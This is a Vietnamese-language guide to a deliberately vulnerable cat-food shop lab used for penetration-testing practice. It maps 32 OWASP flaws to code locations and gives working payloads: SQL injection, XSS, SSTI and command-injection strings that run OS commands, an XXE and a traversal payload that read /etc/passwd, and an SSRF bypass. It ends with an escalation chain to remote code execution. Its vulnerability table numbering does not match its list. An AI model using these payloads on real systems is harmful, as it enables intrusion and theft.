# 🐱 BẢNG TỔNG HỢP & PHÂN TÍCH LỖ HỔNG BẢO MẬT (CMS-OWASP CatFood Shop)

Chào mừng bạn đến với tài liệu hướng dẫn và tổng hợp lỗ hổng của **CatFood Shop Lab**. Đây là dự án website thương mại điện tử bán thức ăn cho mèo, được lập trình có chủ ý chứa **32 lỗ hổng bảo mật** thuộc chuẩn **OWASP Top 10:2021** nhằm phục vụ mục đích nghiên cứu, học tập và thực hành kiểm thử bảo mật (Penetration Testing).

---

## 📊 THỐNG KÊ LỖ HỔNG THEO OWASP TOP 10:2021

| OWASP ID | Danh mục lỗ hổng (OWASP Top 10:2021) | Số lượng | Danh sách Lỗ hổng (ID) | Mức độ nguy hiểm |
|:---:|:---|:---:|:---|:---:|
| **A01:2021** | **Broken Access Control** (Kiểm soát truy cập bị lỗi) | 8 | #5, #12, #13, #14, #15, #16, #27, #33 (BOLA) | **High - Critical** |
| **A02:2021** | **Cryptographic Failures** (Lỗi mã hóa/Mật mã) | 1 | #18 | **Critical** |
| **A03:2021** | **Injection** (Lỗi chèn ép mã) | 11 | #1, #2, #3, #4, #6, #7, #8, #10, #11, #24, #26 | **Critical** |
| **A04:2021** | **Insecure Design** (Thiết kế không an toàn / Logic) | 4 | #20, #21, #22, #28 | **High** |
| **A05:2021** | **Security Misconfiguration** (Cấu hình sai an ninh) | 5 | #25 (XXE), #30, #31, #32, #34 (BOLA status) | **Medium - High** |
| **A07:2021** | **Identification & Authentication Failures** (Lỗi JWT/Auth) | 2 | #17, #19 | **High - Critical** |
| **A08:2021** | **Software & Data Integrity Failures** (Độ toàn vẹn dữ liệu) | 1 | #23 (Pickle RCE) | **Critical** |
| **A10:2021** | **Server-Side Request Forgery** (SSRF) | 1 | #29 | **Medium** |

---

## 🗺️ BẢN ĐỒ CHI TIẾT 32 LỖ HỔNG TRONG HỆ THỐNG

### 🎯 1. Nhóm Lỗ hổng SQL Injection (OWASP A03:2021)
*Toàn bộ cơ chế truy vấn dữ liệu được kết nối thô bằng f-string vào PyMySQL, không sử dụng tham số hóa (Prepared Statements) tạo cơ hội chèn ép lệnh SQL.*

1. **SQL Injection – Login (`routes/auth.py` dòng 31)**
   * **Endpoint:** `POST /api/auth/login`
   * **Cách hoạt động:** Query kiểm tra đăng nhập nối chuỗi trực tiếp `email` và `password`. 
   * **Payload khai thác:** Đăng nhập không cần mật khẩu bằng cách gửi Email: `' OR '1'='1` hoặc `admin@catfood.com' OR role_id=1 AND '1'='1`.
2. **SQL Injection – Register (`routes/auth.py` dòng 86–89)**
   * **Endpoint:** `POST /api/auth/register`
   * **Cách hoạt động:** Câu lệnh `INSERT INTO users` khi đăng ký nối chuỗi thô toàn bộ các trường.
   * **Payload khai thác:** Đăng ký tài khoản và tự nâng lên Admin: `', role_id=1, balance=999999, status=1 -- x` điền vào ô Full Name.
3. **SQL Injection – Search Products (`routes/products.py` dòng 64)**
   * **Endpoint:** `GET /api/products/search?q=`
   * **Cách hoạt động:** Thanh tìm kiếm nối chuỗi `q` trực tiếp vào mệnh đề `LIKE`. Có bộ lọc `/*`, `--`, `#` nhưng bị bypass dễ dàng.
   * **Payload khai thác:** `?q=' UNION SELECT id,email,password_hash,4,5,6,7,8,9,10,11,12,13 FROM users -- x` (Bypass bằng nháy đơn không cần comment nếu trích xuất dữ liệu).
4. **SQL Injection – Get Product by ID (`routes/products.py` dòng 89)**
   * **Endpoint:** `GET /api/products/<id>`
   * **Cách hoạt động:** Route chi tiết sản phẩm nối trực tiếp `product_id` vào query.
   * **Payload khai thác:** `/api/products/1 OR 1=1` hoặc UNION-based SQLi.
5. **SQL Injection & IDOR – Get Orders (`routes/products.py` dòng 41)**
   * **Endpoint:** `GET /api/orders?uuid=`
   * **Cách hoạt động:** Tham số `uuid` truy vấn đơn hàng được cộng trực tiếp vào câu lệnh SQL, kết hợp cả SQLi và IDOR.
   * **Payload khai thác:** `/api/orders?uuid=' UNION SELECT * FROM users -- `
6. **SQL Injection – Add Review (`routes/posts.py` dòng 43–46)**
   * **Endpoint:** `POST /api/posts/add-review`
   * **Cách hoạt động:** Chèn trực tiếp `comment`, `rating` từ request body vào câu lệnh `INSERT` bảng `reviews`.
   * **Payload khai thác:** Comment dạng: `', (SELECT password_hash FROM users LIMIT 1), 5, 1) --`
7. **SQL Injection – Create Post (`routes/posts.py` dòng 129–132)**
   * **Endpoint:** `POST /api/posts`
   * **Cách hoạt động:** Tạo bài viết blog mới nối trực tiếp `title` và `content` vào f-string SQL.
   * **Payload khai thác:** Title: `test', '1', 'content', 1); DROP TABLE posts; --`
8. **SQL Injection – Edit Post (`routes/posts.py` dòng 173)**
   * **Endpoint:** `PUT /api/posts/<id>`
   * **Cách hoạt động:** Thực hiện cập nhật bài viết blog bằng chuỗi động `UPDATE` SQL dựa trên JSON body nhận được.
   * **Payload khai thác:** Body: `{"title": "test', content='hijacked', author_id=1 WHERE id=1 -- "}` để chiếm quyền hoặc sửa bài bất kỳ.
9. **SQL Injection & Mass Assignment – Update Profile (`routes/products.py` dòng 268–278)**
   * **Endpoint:** `PUT /api/profile`
   * **Cách hoạt động:** Vòng lặp lấy toàn bộ key từ client gửi lên và ghép thẳng vào clause `SET` của `UPDATE` mà không giới hạn trường.
   * **Payload khai thác:** Body JSON gửi: `{"role_id": "1", "balance": "999999"}` để tự nâng đặc quyền Admin hoặc bơm tiền ví ảo.

---

### 🔑 2. Nhóm Kiểm soát truy cập & Xác thực (OWASP A01 & A07)
*Hệ thống phân quyền bị lỗi từ middleware JWT cho đến việc thiếu kiểm tra logic sở hữu tài nguyên ở các tầng dịch vụ.*

10. **Broken Access Control – Missing Auth PUT/DELETE (`routes/products.py` dòng 98–128)**
    * **Endpoint:** `PUT /api/products/<id>` & `DELETE /api/products/<id>`
    * **Lỗi:** Không có bất kỳ middleware xác thực token hay phân quyền nào. Bất kỳ ai cũng có thể sửa hoặc xóa sản phẩm.
11. **Broken Access Control – Admin API không Auth (`routes/products.py` dòng 288–352)**
    * **Endpoint:** `GET /api/admin/users`, `DELETE /api/admin/users/<id>`, `POST /api/admin/users/<id>/money`
    * **Lỗi:** Toàn bộ cụm API quản trị hệ thống không kiểm tra JWT token, cho phép xem mật khẩu hash, xóa người dùng, hoặc bơm tiền tùy ý.
12. **IDOR – Xóa Cart Item (`routes/cart.py` dòng 97–99)**
    * **Endpoint:** `DELETE /api/cart/remove/<item_id>`
    * **Lỗi:** Xóa sản phẩm khỏi giỏ hàng chỉ dựa vào `item_id` trên URL mà không đối chiếu item đó có thuộc về giỏ hàng của user hiện tại không.
13. **IDOR – Xem giỏ hàng qua UUID (`routes/cart.py` dòng 20–26)**
    * **Endpoint:** `GET /api/cart?uuid=<uuid>`
    * **Lỗi:** Chỉ cần đăng nhập bằng bất kỳ tài khoản nào là có thể truyền UUID của nạn nhân để xem và lấy cắp thông tin giỏ hàng của họ.
14. **IDOR – Xóa bài viết không check quyền (`routes/posts.py` dòng 142–152)**
    * **Endpoint:** `POST /api/posts/delete/<id>`
    * **Lỗi:** Chỉ kiểm tra trạng thái đăng nhập thông thường, hoàn toàn không đối chiếu bài viết có thuộc về tác giả đang gọi API xóa hay không.
15. **Broken Authentication – Lộ password_hash trong Response (`routes/auth.py` dòng 61)**
    * **Lỗi:** Khi đăng nhập thành công, server trả về toàn bộ Object User bao gồm cả cột mật khẩu `password_hash` trong JSON response cho client.
16. **JWT Algorithm Confusion (alg=none) (`routes/products.py` dòng 20–22, `routes/posts.py` dòng 18–20, `routes/auth.py` dòng 107)**
    * **Lỗi:** Backend giải mã token chấp nhận header chứa `"alg": "none"` và tắt xác minh chữ ký (`verify_signature=False`), cho phép giả mạo bất kỳ JWT token của người dùng hoặc Admin nào mà không cần khóa bí mật `SECRET_KEY`.

---

### 💻 3. Nhóm Tấn công Client-side (XSS) (OWASP A03:2021)
*Dữ liệu đầu vào do người dùng truyền lên không được sanitize và lọc mã độc HTML/JS trước khi kết xuất trả về trình duyệt.*

17. **Stored XSS – Reviews (`routes/posts.py` dòng 33–50)**
    * **Endpoint:** `POST /api/posts/add-review`
    * **Lỗi:** Chỉ lọc thẻ `<script>`, `onerror`, `<img` thô sơ bằng regex, bỏ qua hàng ngàn tag HTML khác. Comment chứa XSS được lưu trực tiếp vào cơ sở dữ liệu và tự động kích hoạt trên trình duyệt của tất cả khách hàng vào xem sản phẩm.
    * **Payload khai thác:** `<svg onload=alert(1)>` hoặc `<details open ontoggle=alert(1)>`.
18. **Reflected XSS – Search Blog (`routes/posts.py` dòng 85)**
    * **Endpoint:** `GET /api/posts/search?q=`
    * **Lỗi:** Tham số tìm kiếm `q` được nhúng thẳng trực tiếp vào response HTML trả về dạng `text/html` mà không qua hàm escape HTML.
    * **Payload khai thác:** `/api/posts/search?q=<script>alert(1)</script>`

---

### 🔄 4. Nhóm Logic Nghiệp vụ & Concurrency (OWASP A04:2021)
*Lỗi thiết kế hệ thống thiếu an toàn trong các luồng giao dịch nhạy cảm.*

19. **Race Condition – Mua hàng (`routes/products.py` dòng 201–219)**
    * **Endpoint:** `POST /api/purchase`
    * **Lỗi:** Đọc số dư ví ví điện tử, tạo độ trễ nhân tạo `time.sleep(0.3)`, sau đó trừ tiền mà không áp dụng khóa cơ sở dữ liệu (`FOR UPDATE`) hoặc Transaction an toàn.
    * **Khai thác:** Gửi 10-20 request đồng thời mua hàng bằng script để thực hiện nhiều giao dịch cùng một thời điểm, làm ví tiền ảo bị âm quá hạn mức 100k.
20. **Race Condition – Checkout giỏ hàng (`routes/cart.py` dòng 151–158)**
    * **Endpoint:** `POST /api/cart/checkout`
    * **Lỗi:** Tương tự như API Mua hàng, không dùng lock CSDL khi thanh toán toàn bộ giỏ hàng.
21. **Price Manipulation – Thao túng giá (`routes/products.py` dòng 193–199)**
    * **Endpoint:** `POST /api/purchase`
    * **Lỗi:** Backend tin tưởng hoàn toàn vào giá trị `price` truyền lên từ JSON body của Client thay vì tự lấy giá niêm yết từ DB.
    * **Payload khai thác:** Gửi JSON body `{"product_id": 1, "quantity": 1, "price": 1}` để mua món đồ 85,000đ chỉ với giá 1đ.

---

### 🚀 5. Nhóm Thực thi mã từ xa & Xử lý File nguy hại (RCE / File Handling)
*Nhóm lỗ hổng Critical nghiêm trọng nhất có thể dẫn tới chiếm quyền kiểm soát hệ điều hành của máy chủ chứa website.*

22. **Insecure Deserialization – Pickle RCE (`routes/products.py` dòng 394)**
    * **Endpoint:** `POST /api/admin/backup/import`
    * **Lỗi:** Nhận dữ liệu backup dạng Base64 từ client, giải mã và gọi trực tiếp `pickle.loads(decoded_data)`.
    * **Khai thác:** Tạo payload đóng gói bằng class `__reduce__` trong Python để thực thi lệnh OS tùy ý khi server thực hiện de-serialize.
23. **Server-Side Template Injection – SSTI Jinja2 (`routes/products.py` dòng 425–437)**
    * **Endpoint:** `GET /api/orders/<id>/invoice?title=`
    * **Lỗi:** Cộng trực tiếp tham số `title` do người dùng truyền từ URL query vào chuỗi HTML template Flask rồi gọi `render_template_string()`.
    * **Payload khai thác:** `?title={{7*7}}` hoặc payload RCE: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` để thực thi mã hệ thống.
24. **XXE – XML External Entity (`routes/products.py` dòng 457–458)**
    * **Endpoint:** `POST /api/orders/import-xml`
    * **Lỗi:** Parser XML lxml cấu hình thiếu an toàn với `resolve_entities=True` và `no_network=False`.
    * **Payload khai thác:** Gửi XML chứa thực thể ngoài để đọc file hệ thống hoặc tấn công SSRF:
      ```xml
      <?xml version="1.0"?>
      <!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <order><receiver_name>&xxe;</receiver_name></order>
      ```
25. **OS Command Injection (Blind) (`routes/products.py` dòng 493)**
    * **Endpoint:** `POST /api/admin/ping`
    * **Lỗi:** Chạy lệnh hệ thống `subprocess.check_output(f"ping -n 2 {ip}", shell=True)` mà không lọc hoặc kiểm duyệt tham số `ip` đầu vào.
    * **Payload khai thác:** Sử dụng toán tử ghép lệnh `&` hoặc `|` để thực thi lệnh OS: `{"ip": "127.0.0.1 & whoami > uploads/out.txt"}`.
26. **Path Traversal / LFI (`routes/products.py` dòng 512–516)**
    * **Endpoint:** `GET /api/files?name=`
    * **Lỗi:** Chỉ lọc thô ký tự `../` thành rỗng (dễ bị bypass bằng `....//`) và ép thêm đuôi `.png` ở cuối (bị bypass hoàn toàn bằng Null Byte `%00`).
    * **Payload khai thác:** `/api/files?name=....//....//....//etc/passwd%00` để đọc tệp tin bất kỳ trên máy chủ.
27. **Unrestricted File Upload (`routes/products.py` dòng 527–537)**
    * **Endpoint:** `POST /api/upload`
    * **Lỗi:** Không kiểm soát phần mở rộng (đuôi) của file tải lên, giữ nguyên tên tệp tin gốc của client (`file.filename`) và lưu thẳng vào thư mục public `uploads/`.
    * **Khai thác:** Tải lên tệp tin `backdoor.py` chứa mã độc Python, sau đó dùng endpoint LFI hoặc chạy lệnh để kích hoạt mã độc.
28. **SSRF – Server-Side Request Forgery (`routes/products.py` dòng 548–555)**
    * **Endpoint:** `POST /api/fetch-preview`
    * **Lỗi:** Chỉ kiểm tra URL bắt đầu bằng `https://google.com`, cho phép bypass bằng subdomain dạng `https://google.com.attacker.com` hoặc dùng ký tự `@` để chuyển hướng request của máy chủ đến dải IP Private/Localhost của mạng nội bộ.
    * **Payload khai thác:** `{"url": "https://google.com@127.0.0.1:3306"}` để quét cổng CSDL.

---

### ⚙️ 6. Nhóm Cấu hình sai An ninh (OWASP A05:2021)

29. **Security Misconfiguration – Debug Mode (`app.py` dòng 41)**
    * **Lỗi:** Ứng dụng chạy trên môi trường giả lập Product nhưng bật cấu hình `app.run(debug=True)`. Khi xảy ra lỗi, Flask hiện stack trace chi tiết kèm mã PIN debug cho phép thực thi Python từ xa ngay trên trình duyệt.
30. **Security Misconfiguration – CORS quá rộng (`app.py` dòng 18)**
    * **Lỗi:** Cấu hình `CORS(app, origins="*", supports_credentials=True)` cho phép bất kỳ website ngoài nào cũng đọc được dữ liệu phản hồi API kèm thông tin cookies/credentials.
31. **Security Misconfiguration – Lộ cấu hình hệ thống (`routes/products.py` dòng 355–365)**
    * **Endpoint:** `GET /api/debug/config`
    * **Lỗi:** Không phân quyền kiểm soát truy cập, trả về toàn bộ biến môi trường cực kỳ nhạy cảm bao gồm `SECRET_KEY` dùng ký JWT và tài khoản mật khẩu MySQL Database.
32. **Broken Access Control – Cập nhật trạng thái Đơn hàng (BOLA) (`routes/products.py` dòng 605)**
    * **Endpoint:** `POST /api/admin/orders/<order_id>/status`
    * **Lỗi:** Không kiểm tra `role_id` của JWT token hiện tại xem có phải là Admin hay không trước khi cập nhật trạng thái đơn hàng. Bất cứ tài khoản thường nào đăng nhập cũng có thể tự duyệt hoặc hủy đơn hàng tùy ý.

---

## 🔗 CHUỖI TẤN CÔNG LEO THANG LÊN RCE (EXPLOITATION CHAIN)

Các lỗ hổng trong phòng Lab này được thiết kế để kết hợp liên hoàn với nhau mô phỏng cuộc tấn công thực tế:

```
Bước 1: Thu thập thông tin nhạy cảm
  👉 GET /api/debug/config (Rò rỉ SECRET_KEY và thông tin MySQL)
          │
          ▼
Bước 2: Bypass xác thực / Giả mạo quyền lực
  👉 Sử dụng SECRET_KEY để tạo JWT admin giả mạo
  👉 Hoặc dùng JWT Algorithm Confusion (alg=none) để nâng quyền role_id=1
          │
          ▼
Bước 3: Khai thác thông tin sâu hơn
  👉 GET /api/admin/users (Lộ danh sách mật khẩu dạng plain text)
          │
          ▼
Bước 4: Leo thang đặc quyền / Chiếm đoạt tài chính
  👉 Price Manipulation: mua sản phẩm giá 85.000đ với 1đ
  👉 Race Condition: spam request mua hàng để ví ảo bị âm tiền
          │
          ▼
Bước 5: Thực thi mã từ xa chiếm quyền Server (RCE)
  👉 SSTI: Gọi os.popen tại API Hóa đơn qua tham số ?title={{...}}
  👉 Pickle RCE: Gửi dữ liệu backup chứa mã độc base64 vào API Import Backup
  👉 OS Command Injection: Thực thi mã qua ping IP bằng dấu ghép lệnh &
```

---
*Tài liệu được biên soạn làm cẩm nang học tập độc quyền cho dự án phòng Lab CMS-OWASP CatFood Shop.*
